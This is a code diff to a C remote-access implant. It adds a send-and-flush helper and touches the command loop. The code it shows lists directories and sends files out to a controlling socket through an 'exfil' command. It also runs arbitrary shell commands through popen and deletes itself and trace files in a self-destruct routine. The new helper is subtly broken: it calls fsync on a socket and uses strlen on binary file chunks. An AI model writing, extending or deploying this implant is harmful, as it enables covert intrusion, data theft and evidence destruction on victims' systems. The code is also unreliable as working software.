@@ -20,6 +20,16 @@ void trim_newline(char *s) {
         s[--len] = '\0';
 }
 
+// Sending response with flushing
+int send_response(const char *msg) {
+    int bytes_sent = send(sock, msg, strlen(msg), 0);
+    fsync(sock); // Ensure data is sent immediately
+    if (bytes_sent < 0) {
+        perror("[-] Error sending response");
+    }
+    return bytes_sent;
+}
+
 int list_dir(const char *dir_path) {
     DIR *d = opendir(dir_path);
     if (!d) return -1;
@@ -28,12 +38,12 @@ int list_dir(const char *dir_path) {
     char msg[BUF_SIZE];
     while ((entry = readdir(d)) != NULL) {
         snprintf(msg, BUF_SIZE, "[*] %s\n", entry->d_name);
-        send(sock, msg, strlen(msg), 0);
+        send_response(msg);
     }
     closedir(d);
 
     const char *end_msg = "[*] END\n";
-    send(sock, end_msg, strlen(end_msg), 0);
+    send_response(end_msg);
     return 0;
 }
 
@@ -41,14 +51,14 @@ int send_file(const char *file_path) {
     FILE *fp = fopen(file_path, "rb");
     if (!fp) {
         const char *err = "[-] Failed to open file\n";
-        send(sock, err, strlen(err), 0);
+        send_response(err);
         return -1;
     }
 
     char buf[BUF_SIZE];
     size_t n;
     while ((n = fread(buf, 1, BUF_SIZE, fp)) > 0) {
-        if (send(sock, buf, n, 0) < 0) {
+        if (send_response(buf) < 0) {
             perror("[-] Send error");
             break;
         }
@@ -56,7 +66,7 @@ int send_file(const char *file_path) {
     fclose(fp);
 
     const char *end_msg = "\n[*] END\n";
-    send(sock, end_msg, strlen(end_msg), 0);
+    send_response(end_msg);
     return 0;
 }
 
@@ -95,35 +105,35 @@ int main() {
                 remove(self_path);
             }
             remove("/tmp/i");
-            remove("/tmp/implant");
-            remove("/tmp/implant_client");
-            remove("/tmp/.i");
-
+            remove("/tmp/exfil");
+            remove("/usr/bin/syslogd");
             send(sock, "Implant self-destructed and traces wiped\n", 41, 0);
-            break;
+            shutdown(sock, SHUT_WR);
+            close(sock);  
+            exit(0);
         }
 
         if (strncmp(buffer, "list ", 5) == 0) {
             char *dir = buffer + 5;
             if (list_dir(dir) < 0)
-                send(sock, "[-] Failed to list directory\n", 30, 0);
+                send_response("[-] Failed to list directory\n");
             continue;
         }
 
         if (strncmp(buffer, "exfil ", 6) == 0) {
             char *file = buffer + 6;
             if (send_file(file) < 0)
-                send(sock, "[-] File exfiltration failed\n", 30, 0);
+                send_response("[-] File exfiltration failed\n");
             continue;
         }
 
         // fallback: shell command
         FILE *fp = popen(buffer, "r");
         if (!fp) {
-            send(sock, "[-] Command execution failed\n", 30, 0);
+            send_response("[-] Command execution failed\n");
         } else {
             while (fgets(buffer, BUF_SIZE, fp)) {
-                send(sock, buffer, strlen(buffer), 0);
+                send_response(buffer);
             }
             pclose(fp);
         }
